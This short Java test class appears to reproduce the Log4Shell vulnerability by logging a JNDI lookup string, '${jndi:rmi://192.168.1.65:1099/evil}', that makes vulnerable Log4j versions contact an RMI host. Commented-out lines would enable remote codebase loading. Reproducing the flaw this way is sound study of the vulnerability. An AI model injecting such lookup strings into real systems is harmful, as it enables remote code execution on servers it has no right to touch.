package cn.axboy.demo.server;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {

    private static final Logger log = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String rmi = "${jndi:rmi://192.168.1.65:1099/evil}";
        String os = "${java:os}";
        log.info("test rmi: {}", rmi);
        log.info("test os: {}", os);
    }
}
